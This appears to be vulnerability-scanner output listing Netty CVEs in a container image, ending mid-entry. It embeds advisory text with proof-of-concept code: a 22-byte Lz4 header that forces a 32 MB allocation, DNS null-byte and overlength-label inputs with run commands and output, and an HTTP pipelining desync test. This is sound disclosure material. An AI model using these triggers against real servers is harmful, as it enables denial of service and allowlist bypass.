```yaml
╭ [0] ╭ [0]  ╭ VulnerabilityID : CVE-2026-42583 
│     │      ├ VendorIDs        ─ [0]: GHSA-mj4r-2hfc-f8p6 
│     │      ├ PkgName         : io.netty:netty-codec-compression 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
│     │      │                  ╰ UID : d5a032dd793fa143 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42583 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:5ce5a91b635def64a154f703b44890f48a887fe7e13583cf4e0b64f360b9300f 
│     │      ├ Title           : Netty Lz4FrameDecoder is vulnerable to resource exhaustion  
│     │      ├ Description     : ### Summary
│     │      │                   Lz4FrameDecoder allocates a ByteBuf of size `decompressedLength` (up to 32 MB
│     │      │                   per block) before LZ4 runs. A peer only needs a 21-byte header plus
│     │      │                   `compressedLength` payload bytes - 22 bytes if `compressedLength == 1` - to
│     │      │                   force that allocation.
│     │      │                   
│     │      │                   ### Details
│     │      │                   io.netty.handler.codec.compression.Lz4FrameDecoder#decode
│     │      │                   Header fields are trusted for sizing. On the compressed path, after
│     │      │                   `readableBytes >= compressedLength`, the decoder does
│     │      │                   `ctx.alloc().buffer(decompressedLength, decompressedLength)` then
│     │      │                   decompresses.
│     │      │                   ### PoC
│     │      │                   The test below demonstrates how an attacker sending 22 bytes will force the
│     │      │                   server to allocate 32MB
│     │      │                   ```java
│     │      │                       @Test
│     │      │                       void test() throws Exception {
│     │      │                           EventLoopGroup workerGroup = new
│     │      │                   MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
│     │      │                           try {
│     │      │                               AtomicReference<Throwable> serverError = new AtomicReference<>();
│     │      │                               CountDownLatch latch = new CountDownLatch(1);
│     │      │                               ServerBootstrap server = new ServerBootstrap()
│     │      │                                       .group(workerGroup)
│     │      │                                       .channel(NioServerSocketChannel.class)
│     │      │                                       .childHandler(new ChannelInitializer<SocketChannel>() {
│     │      │                                           @Override
│     │      │                                           protected void initChannel(SocketChannel ch) {
│     │      │                                               ch.pipeline()
│     │      │                                                       .addLast(new Lz4FrameDecoder())
│     │      │                                                       .addLast(new
│     │      │                   ChannelInboundHandlerAdapter() {
│     │      │                                                           @Override
│     │      │                                                           public void
│     │      │                   exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
│     │      │                                                               if (cause instanceof
│     │      │                   DecoderException) {
│     │      │                                                                  
│     │      │                   serverError.set(cause.getCause());
│     │      │                                                               } else {
│     │      │                                                                   serverError.set(cause);
│     │      │                                                               }
│     │      │                                                               latch.countDown();
│     │      │                                                           }
│     │      │                                                       });
│     │      │                                           }
│     │      │                                       });
│     │      │                               ChannelFuture serverChannel = server.bind(0).sync();
│     │      │                               Bootstrap client = new Bootstrap()
│     │      │                                       .channel(NioSocketChannel.class)
│     │      │                                       .handler(new ChannelInboundHandlerAdapter() {
│     │      │                                           public void channelActive(ChannelHandlerContext ctx)
│     │      │                   {
│     │      │                                               ByteBuf buf = ctx.alloc().buffer(22, 22);
│     │      │                                               buf.writeLong(MAGIC_NUMBER);
│     │      │                                               buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
│     │      │                                               buf.writeIntLE(1);
│     │      │                                               buf.writeIntLE(1 << 25);
│     │      │                                               buf.writeIntLE(0);
│     │      │                                               buf.writeByte(0);
│     │      │                                               ctx.writeAndFlush(buf);
│     │      │                                               ctx.fireChannelActive();
│     │      │                               ChannelFuture clientChannel =
│     │      │                   client.connect(serverChannel.channel().localAddress()).sync();
│     │      │                               assertTrue(latch.await(10, TimeUnit.SECONDS));
│     │      │                               assertInstanceOf(IndexOutOfBoundsException.class,
│     │      │                   serverError.get());
│     │      │                               clientChannel.channel().close();
│     │      │                               serverChannel.channel().close();
│     │      │                           } finally {
│     │      │                               workerGroup.shutdownGracefully();
│     │      │                           }
│     │      │                       }
│     │      │                   ```
│     │      │                   ### Impact
│     │      │                   Untrusted senders without per-channel / aggregate limits can stress memory
│     │      │                   with many small requests. 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-mj4r-2hfc-f8p6 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-42579 
│     │      ├ VendorIDs        ─ [0]: GHSA-cm33-6792-r9fm 
│     │      ├ PkgName         : io.netty:netty-codec-dns 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
│     │      │                  ╰ UID : d1018bca82fa2aba 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42579 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:31761cae1acadc08bab282cb4cd44d4796b9598090b62a0d23254a94a5f1b41b 
│     │      ├ Title           : Netty has a DNS Codec Input Validation Bypass (Encoder + Decoder) 
│     │      ├ Description     : # Security Vulnerability Report: DNS Codec Input Validation Bypass in Netty
│     │      │                   (Encoder + Decoder)
│     │      │                   
│     │      │                   ## 1. Vulnerability Summary
│     │      │                   | Field | Value |
│     │      │                   |-------|-------|
│     │      │                   | **Product** | Netty |
│     │      │                   | **Version** | 4.2.12.Final (and all prior versions with codec-dns) |
│     │      │                   | **Component** | `io.netty.handler.codec.dns.DnsCodecUtil` |
│     │      │                   | **Vulnerability Type** | CWE-20: Improper Input Validation / CWE-626: Null
│     │      │                   Byte Interaction Error / CWE-400: Uncontrolled Resource Consumption |
│     │      │                   | **Impact** | DNS Cache Poisoning / Domain Validation Bypass / Denial of
│     │      │                   Service / Malformed DNS Packets |
│     │      │                   ## 2. Affected Components
│     │      │                   Both the encoder and decoder in the same file are affected:
│     │      │                   - `io.netty.handler.codec.dns.DnsCodecUtil` — `encodeDomainName()` method
│     │      │                   (lines 31-51):
│     │      │                     - No null byte validation in domain name labels
│     │      │                     - No per-label length validation (RFC 1035 max: 63 bytes)
│     │      │                     - No total domain name length validation (RFC 1035 max: 255 bytes)
│     │      │                     - Empty labels silently truncate the domain name
│     │      │                   - `io.netty.handler.codec.dns.DnsCodecUtil` — `decodeDomainName()` method
│     │      │                   (lines 53-118):
│     │      │                     - No per-label length validation (max 63)
│     │      │                     - No total domain name length validation (max 255)
│     │      │                     - Unbounded StringBuilder growth from attacker-controlled DNS responses
│     │      │                   ## 3. Vulnerability Description
│     │      │                   Netty's DNS codec does **not enforce RFC 1035 domain name constraints** during
│     │      │                    either encoding or decoding. This creates a bidirectional attack surface:
│     │      │                   malicious DNS responses can exploit the decoder, and user-influenced hostnames
│     │      │                    can exploit the encoder.
│     │      │                   ### 3.1 Encoder Side — Null Byte Injection (CWE-626)
│     │      │                   A domain name containing a null byte (e.g., `"evil\0.example.com"`) is encoded
│     │      │                    with the null byte embedded in the label data. This creates a domain name
│     │      │                   that different DNS implementations interpret differently:
│     │      │                   - **Java (full string)**: sees `"evil\0.example.com"` as a single label
│     │      │                   containing a null
│     │      │                   - **C/native DNS libraries**: truncate at the null byte, seeing only `"evil"`
│     │      │                   - **DNS servers**: may accept or reject based on implementation
│     │      │                   This differential interpretation enables **DNS cache poisoning** and **domain
│     │      │                   validation bypass**.
│     │      │                   ### 3.2 Encoder Side — Overlength Label (RFC 1035 Violation)
│     │      │                   Labels exceeding 63 bytes are accepted by the encoder. The length byte is
│     │      │                   written as a single unsigned byte, so a 200-byte label writes `0xC8` (200) as
│     │      │                   the length. Per RFC 1035, values 192-255 indicate **compression pointers**.
│     │      │                   This means:
│     │      │                   - A 200-byte label length `0xC8` would be interpreted as a **compression
│     │      │                   pointer** by standards-compliant DNS parsers
│     │      │                   - This creates **parser confusion** between label and pointer interpretation
│     │      │                   ### 3.3 Encoder Side — Silent Truncation via Empty Labels
│     │      │                   ```java
│     │      │                   encodeDomainName("a..b.com", buf);
│     │      │                   // Encodes as: [01] 'a' [00]
│     │      │                   // Only "a." is encoded, ".b.com" is silently dropped!
│     │      │                   ```
│     │      │                   An attacker can craft input like `"safe-domain..evil.com"` which gets
│     │      │                   truncated to just `"safe-domain."`, potentially bypassing domain allowlists.
│     │      │                   ### 3.4 Decoder Side — Unbounded Memory Allocation
│     │      │                   The decoder accepts labels of any length (0-255 bytes) without checking the
│     │      │                   RFC 1035 per-label limit of 63 bytes or the total domain name limit of 255
│     │      │                   bytes. A malicious DNS server can return responses with oversized labels,
│     │      │                   causing excessive memory allocation.
│     │      │                   ### Root Cause — Encoder
│     │      │                   // DnsCodecUtil.java:31-51
│     │      │                   static void encodeDomainName(String name, ByteBuf buf) {
│     │      │                       if (ROOT.equals(name)) {
│     │      │                           buf.writeByte(0);
│     │      │                           return;
│     │      │                       }
│     │      │                       final String[] labels = name.split("\\.");
│     │      │                       for (String label : labels) {
│     │      │                           final int labelLen = label.length();
│     │      │                           if (labelLen == 0) {
│     │      │                               break;  // NO ERROR - silently truncates!
│     │      │                           }
│     │      │                           // NO check: labelLen > 63
│     │      │                           // NO check: label contains null bytes
│     │      │                           // NO check: total name > 255 bytes
│     │      │                           buf.writeByte(labelLen);                    // Can write values > 63!
│     │      │                           ByteBufUtil.writeAscii(buf, label);         // Null bytes pass
│     │      │                   through!
│     │      │                       buf.writeByte(0);
│     │      │                   }
│     │      │                   ### Root Cause — Decoder
│     │      │                   // DnsCodecUtil.java:94-99 (decodeDomainName)
│     │      │                   } else if (len != 0) {
│     │      │                       if (!in.isReadable(len)) {  // Only checks if bytes EXIST, not if len <=
│     │      │                   63
│     │      │                           throw new CorruptedFrameException("truncated label in a name");
│     │      │                       name.append(in.toString(in.readerIndex(), len,
│     │      │                   CharsetUtil.UTF_8)).append('.');
│     │      │                       //    ^^^^^^ StringBuilder grows WITHOUT any length limit
│     │      │                       in.skipBytes(len);
│     │      │                   **Missing checks in decoder**:
│     │      │                   - No `if (len > 63)` check per RFC 1035 Section 2.3.4
│     │      │                   - No `if (name.length() > 255)` check for total domain name length
│     │      │                   ## 4. Exploitability Prerequisites
│     │      │                   ### Encoder Side (outbound)
│     │      │                   1. An application constructs DNS queries using Netty's DNS codec with
│     │      │                   user-influenced domain names
│     │      │                   2. The constructed DNS packets are sent to DNS servers or resolvers
│     │      │                   ### Decoder Side (inbound)
│     │      │                   1. An application uses Netty's `codec-dns` or `resolver-dns` module to process
│     │      │                    DNS responses
│     │      │                   2. The application communicates with a malicious or compromised DNS server
│     │      │                   **Attack surface**: Any Netty application using DNS resolution
│     │      │                   (`DnsNameResolver`) is potentially affected on the decoder side, as DNS
│     │      │                   responses from the network are attacker-controlled. The encoder side requires
│     │      │                   user-controlled hostnames.
│     │      │                   ## 5. Attack Scenarios
│     │      │                   ### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)
│     │      │                   String hostname = userInput;  // "evil\0.trusted.com"
│     │      │                   DnsQuery query = new DefaultDnsQuery(...)
│     │      │                       .addRecord(DnsSection.QUESTION,
│     │      │                           new DefaultDnsQuestion(hostname, DnsRecordType.A));
│     │      │                   The DNS query for `"evil\0.trusted.com"` may be interpreted by some resolvers
│     │      │                   as a query for `"evil"` (truncated at null). If the attacker controls the DNS
│     │      │                   for `"evil"`, they can return a response that gets cached for
│     │      │                   `"evil\0.trusted.com"` (or vice versa), poisoning the cache.
│     │      │                   ### Scenario 2: Label/Pointer Confusion (Encoder)
│     │      │                   A 200-byte label writes length byte `0xC8`. Standards-compliant parsers
│     │      │                   interpret `0xC0-0xFF` as **compression pointer** prefixes (RFC 1035 Section
│     │      │                   4.1.4). The resulting DNS packet is structurally ambiguous:
│     │      │                   Byte:  [C8] [61 61 61 ... (200 bytes)]
│     │      │                            ↑
│     │      │                      Label interpretation: 200-byte label starting with 'a'
│     │      │                      Pointer interpretation: pointer to offset 0x0861 = 2145
│     │      │                   ### Scenario 3: Memory Exhaustion via Large Labels (Decoder)
│     │      │                   A malicious DNS server returns a response with a 255-byte label (RFC limit:
│     │      │                   63). Netty decodes it without error, creating a 260+ character String. With
│     │      │                   compression pointers, a small DNS response can cause megabytes of
│     │      │                   StringBuilder allocation.
│     │      │                   ### Scenario 4: Domain Truncation via Empty Label (Encoder)
│     │      │                   encodeDomainName("safe-domain..evil.com", buf);
│     │      │                   // Only "safe-domain." is encoded, "evil.com" silently dropped
│     │      │                   This can bypass domain allowlists that check the input string.
│     │      │                   ### Scenario 5: Downstream Processing Failures (Decoder)
│     │      │                   Applications that pass decoded domain names to other DNS libraries,
│     │      │                   certificate validators, or URL parsers may crash or behave incorrectly when
│     │      │                   receiving names > 255 bytes, as these systems typically assume RFC 1035
│     │      │                   compliance.
│     │      │                   ## 6. Proof of Concept
│     │      │                   ### PoC 1: Encoder Null Byte and Overlength (DnsEncoderNullBytePoC.java)
│     │      │                   import io.netty.buffer.ByteBuf;
│     │      │                   import io.netty.buffer.Unpooled;
│     │      │                   import java.lang.reflect.Method;
│     │      │                   import java.nio.charset.StandardCharsets;
│     │      │                   public class DnsEncoderNullBytePoC {
│     │      │                       public static void main(String[] args) throws Exception {
│     │      │                           System.out.println("=== Netty DNS Encoder Validation Bypass PoC
│     │      │                   ===\n");
│     │      │                           Class<?> clazz =
│     │      │                   Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
│     │      │                           Method encode = clazz.getDeclaredMethod("encodeDomainName",
│     │      │                               String.class, ByteBuf.class);
│     │      │                           encode.setAccessible(true);
│     │      │                           // Test 1: Null byte in domain name
│     │      │                           ByteBuf buf = Unpooled.buffer(256);
│     │      │                           encode.invoke(null, "evil\0.example.com", buf);
│     │      │                           byte[] bytes = new byte[buf.readableBytes()];
│     │      │                           buf.readBytes(bytes);
│     │      │                           buf.release();
│     │      │                           System.out.print("[TEST 1] Null byte - Encoded: ");
│     │      │                           for (byte b : bytes) System.out.printf("%02x ", b & 0xff);
│     │      │                           System.out.println("\nVULNERABLE: Null byte 0x00 in label data!");
│     │      │                           // Test 2: 200-byte label
│     │      │                           ByteBuf buf2 = Unpooled.buffer(512);
│     │      │                           encode.invoke(null, "a".repeat(200) + ".com", buf2);
│     │      │                           System.out.println("\n[TEST 2] 200-byte label encoded: " +
│     │      │                   buf2.readableBytes() + " bytes");
│     │      │                           System.out.println("VULNERABLE: Overlength label accepted!");
│     │      │                           buf2.release();
│     │      │                           // Test 3: Empty label truncation
│     │      │                           ByteBuf buf3 = Unpooled.buffer(256);
│     │      │                           encode.invoke(null, "a..b.com", buf3);
│     │      │                           byte[] bytes3 = new byte[buf3.readableBytes()];
│     │      │                           buf3.readBytes(bytes3);
│     │      │                           buf3.release();
│     │      │                           System.out.print("\n[TEST 3] Empty label - Encoded: ");
│     │      │                           for (byte b : bytes3) System.out.printf("%02x ", b & 0xff);
│     │      │                           System.out.println("\nVULNERABLE: Domain silently truncated!");
│     │      │                   ### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)
│     │      │                   public class DnsDecoderLengthPoC {
│     │      │                           System.out.println("=== Netty DNS Decoder Length Bypass PoC ===\n");
│     │      │                           Method decode = clazz.getDeclaredMethod("decodeDomainName",
│     │      │                   ByteBuf.class);
│     │      │                           decode.setAccessible(true);
│     │      │                           // Test 1: 100-byte label (RFC limit: 63)
│     │      │                           ByteBuf buf1 = Unpooled.buffer(256);
│     │      │                           buf1.writeByte(100);
│     │      │                           buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US_ASCII));
│     │      │                           buf1.writeByte(3);
│     │      │                           buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
│     │      │                           buf1.writeByte(0);
│     │      │                           String r1 = (String) decode.invoke(null, buf1);
│     │      │                           buf1.release();
│     │      │                           System.out.println("[TEST 1] 100-byte label: length=" + r1.length() +
│     │      │                               " VULNERABLE=" + (r1.length() > 64));
│     │      │                           // Test 2: 5 x 60-byte labels = 305 bytes (RFC limit: 255)
│     │      │                           for (int i = 0; i < 5; i++) {
│     │      │                               buf2.writeByte(60);
│     │      │                               buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
│     │      │                                   .getBytes(StandardCharsets.US_ASCII));
│     │      │                           buf2.writeByte(0);
│     │      │                           String r2 = (String) decode.invoke(null, buf2);
│     │      │                           System.out.println("[TEST 2] 305-byte domain: length=" + r2.length()
│     │      │                   +
│     │      │                               " VULNERABLE=" + (r2.length() > 255));
│     │      │                   ### How to Compile and Run
│     │      │                   ```bash
│     │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path
│     │      │                   "*/4.2.12.Final/*" \
│     │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
│     │      │                   # Encoder PoC
│     │      │                   javac -cp "$JARS" DnsEncoderNullBytePoC.java
│     │      │                   java --add-opens java.base/java.lang=ALL-UNNAMED -cp "$JARS:."
│     │      │                   DnsEncoderNullBytePoC
│     │      │                   # Decoder PoC
│     │      │                   javac -cp "$JARS" DnsDecoderLengthPoC.java
│     │      │                   DnsDecoderLengthPoC
│     │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
│     │      │                   **Encoder PoC:**
│     │      │                   === Netty DNS Encoder Validation Bypass PoC ===
│     │      │                   [TEST 1] Null byte in domain name
│     │      │                     Input: "evil\0.example.com"
│     │      │                     Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00
│     │      │                     Null byte in label data: true
│     │      │                     VULNERABLE: YES - Null byte accepted!
│     │      │                   [TEST 2] Label > 63 bytes in encoder
│     │      │                     Input: "aaaaaa..." (200-char label)
│     │      │                     Encoded bytes: 206
│     │      │                     VULNERABLE: YES - Overlength label accepted in encoder!
│     │      │                   [TEST 3] Empty labels (consecutive dots)
│     │      │                     Input: "a..b.com"
│     │      │                     Encoded bytes: 01 61 00
│     │      │                     Note: Empty label truncates the name (may lose data)
│     │      │                   **Decoder PoC:**
│     │      │                   === Netty DNS Decoder Length Bypass PoC ===
│     │      │                   [TEST 1] Label > 63 bytes (RFC 1035 violation)
│     │      │                     Label length: 100 bytes (RFC limit: 63)
│     │      │                     Decoded name length: 105
│     │      │                     VULNERABLE: YES - Label > 63 bytes accepted!
│     │      │                   [TEST 2] Domain > 255 bytes via multiple labels
│     │      │                     5 labels x 60 bytes = 300+ bytes total
│     │      │                     RFC 1035 limit: 255 bytes
│     │      │                     Decoded name length: 305
│     │      │                     VULNERABLE: YES - Domain > 255 bytes accepted!
│     │      │                   ## 7. Impact Analysis
│     │      │                   | Impact Category | Description |
│     │      │                   |----------------|-------------|
│     │      │                   | **Integrity** | HIGH — Null byte injection causes differential
│     │      │                   interpretation across DNS implementations |
│     │      │                   | **Availability** | HIGH — Malicious DNS responses can cause unbounded memory
│     │      │                    allocation via decoder |
│     │      │                   | **DNS Cache Poisoning** | Different parsers see different domain names from
│     │      │                   the same encoded packet |
│     │      │                   | **Domain Validation Bypass** | Null bytes can bypass allowlist/blocklist
│     │      │                   checks in DNS proxies |
│     │      │                   | **Label/Pointer Confusion** | Length bytes > 63 conflict with RFC 1035
│     │      │                   compression pointer encoding |
│     │      │                   | **Silent Truncation** | Empty labels silently drop the remainder of the
│     │      │                   domain name |
│     │      │                   | **Downstream Failures** | Oversized domain names may crash certificate
│     │      │                   validators, URL parsers, or other DNS-aware libraries |
│     │      │                   ## 8. Remediation Recommendations
│     │      │                   ### Fix for Encoder (encodeDomainName)
│     │      │                       int totalLength = 0;
│     │      │                               throw new IllegalArgumentException("DNS name contains empty label:
│     │      │                    " + name);
│     │      │                           if (labelLen > 63) {
│     │      │                               throw new IllegalArgumentException(
│     │      │                                   "DNS label length " + labelLen + " exceeds maximum of 63: " +
│     │      │                   name);
│     │      │                           for (int i = 0; i < label.length(); i++) {
│     │      │                               if (label.charAt(i) == '\0') {
│     │      │                                   throw new IllegalArgumentException(
│     │      │                                       "DNS label contains null byte at index " + i);
│     │      │                               }
│     │      │                           totalLength += 1 + labelLen;
│     │      │                           if (totalLength > 254) {
│     │      │                                   "DNS name exceeds maximum length of 255: " + name);
│     │      │                           buf.writeByte(labelLen);
│     │      │                           ByteBufUtil.writeAscii(buf, label);
│     │      │                   ### Fix for Decoder (decodeDomainName)
│     │      │                   // Add after "} else if (len != 0) {":
│     │      │                   if (len > 63) {
│     │      │                       throw new CorruptedFrameException("DNS label length " + len + " exceeds
│     │      │                   maximum of 63");
│     │      │                   // Add after "name.append(...)":
│     │      │                   if (name.length() > 255) {
│     │      │                       throw new CorruptedFrameException("DNS domain name length exceeds maximum
│     │      │                   of 255");
│     │      │                   ## 9. Resources
│     │      │                   - [RFC 1035 Section 2.3.4: Size
│     │      │                   Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
│     │      │                   - [RFC 1035 Section 4.1.4: Message
│     │      │                   Compression](https://tools.ietf.org/html/rfc1035#section-4.1.4)
│     │      │                   - [CWE-20: Improper Input
│     │      │                   Validation](https://cwe.mitre.org/data/definitions/20.html)
│     │      │                   - [CWE-400: Uncontrolled Resource
│     │      │                   Consumption](https://cwe.mitre.org/data/definitions/400.html)
│     │      │                   - [CWE-626: Null Byte Interaction
│     │      │                   Error](https://cwe.mitre.org/data/definitions/626.html) 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N 
│     │      │                         ╰ V3Score : 7.5 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ├ [1]: https://github.com/netty/netty/security/advisories/GHSA-cm33-6792-r9fm 
│     │                         ├ [2]: https://tools.ietf.org/html/rfc1035#section-2.3.4 
│     │                         ╰ [3]: https://tools.ietf.org/html/rfc1035#section-4.1.4 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-42584 
│     │      ├ VendorIDs        ─ [0]: GHSA-57rv-r2g8-2cj3 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42584 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:e4a25d9c00c8b30fffea0dcf8f8be455e058816507592566357acfa1879ca833 
│     │      ├ Title           : Netty has HttpClientCodec response desynchronization 
│     │      ├ Description     : ### Summary
│     │      │                    If HttpClientCodec is configured, there are use cases when a response body
│     │      │                   from one request, can be parsed as another's.
│     │      │                   
│     │      │                   ### Details
│     │      │                   HttpClientCodec pairs each inbound response with an outbound request by
│     │      │                   `queue.poll()` once per response, including for `1xx`. If the client pipelines
│     │      │                    GET then HEAD and the server sends 103, then 200 with GET body, then 200 for
│     │      │                   HEAD, the queue pairs HEAD with the first 200. The HEAD rule then skips
│     │      │                   reading that message’s body, so the GET entity bytes stay on the stream and
│     │      │                   the following 200 is parsed from the wrong offset.
│     │      │                   Prerequisites 
│     │      │                   - HTTP/1.1 pipelining
│     │      │                   - HEAD in the pipeline
│     │      │                   - The server sends 1xx
│     │      │                   ### PoC
│     │      │                   ```java
│     │      │                       @Test
│     │      │                       public void test() {
│     │      │                           EmbeddedChannel channel = new EmbeddedChannel(new HttpClientCodec());
│     │      │                           assertTrue(channel.writeOutbound(new
│     │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, "/1")));
│     │      │                           ByteBuf request = channel.readOutbound();
│     │      │                           request.release();
│     │      │                           assertNull(channel.readOutbound());
│     │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.HEAD, "/2")));
│     │      │                           request = channel.readOutbound();
│     │      │                           String responseStr = "HTTP/1.1 103 Early Hints\r\n\r\n" +
│     │      │                                   "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello" +
│     │      │                                   "HTTP/1.1 200 OK\r\n\r\n";
│     │      │                           assertTrue(channel.writeInbound(Unpooled.copiedBuffer(responseStr,
│     │      │                   CharsetUtil.US_ASCII)));
│     │      │                           // Response 1
│     │      │                           HttpResponse response = channel.readInbound();
│     │      │                           assertEquals(HttpResponseStatus.EARLY_HINTS, response.status());
│     │      │                           LastHttpContent last = channel.readInbound();
│     │      │                           assertEquals(0, last.content().readableBytes());
│     │      │                           last.release();
│     │      │                           // Response 2
│     │      │                           response = channel.readInbound();
│     │      │                           assertEquals(HttpResponseStatus.OK, response.status());
│     │      │                           last = channel.readInbound();
│     │      │                           // Response 3
│     │      │                           FullHttpResponse response1 = channel.readInbound();
│     │      │                           assertTrue(response1.decoderResult().isFailure());
│     │      │                           assertEquals(0, response1.content().readableBytes());
│     │      │                           response1.release();
│     │      │                           assertFalse(channel.finish());
│     │      │                       }
│     │      │                   ```
│     │      │                   ### Impact
│     │      │                   Integrity/availability of HTTP parsing on that connection, unsafe reuse of the
│     │      │                    socket. 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L 
│     │      │                         ╰ V3Score : 7.3 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-57rv-r2g8-2cj3 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-42587 
│     │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
│     │      │                  ╰ UID : 42139b2b89dda2f4 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:1bb46d795a7497b13b63d4a8826de74e12cf486b9e15e9a38d14f8e430e52f9e 
│     │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when Content-Encoding set
│     │      │                   to br/zstd/snappy leads to decompression bomb DoS 
│     │      ├ Description     : ## Summary
│     │      │                   
│     │      │                   `HttpContentDecompressor` accepts a `maxAllocation` parameter to limit
│     │      │                   decompression buffer size and prevent decompression bomb attacks. This limit
│     │      │                   is correctly enforced for gzip and deflate encodings via `ZlibDecoder`, but is
│     │      │                    silently ignored when the content encoding is `br` (Brotli), `zstd`, or
│     │      │                   `snappy`. An attacker can bypass the configured decompression limit by sending
│     │      │                    a compressed payload with `Content-Encoding: br` instead of
│     │      │                   `Content-Encoding: gzip`, causing unbounded memory allocation and
│     │      │                   out-of-memory denial of service.
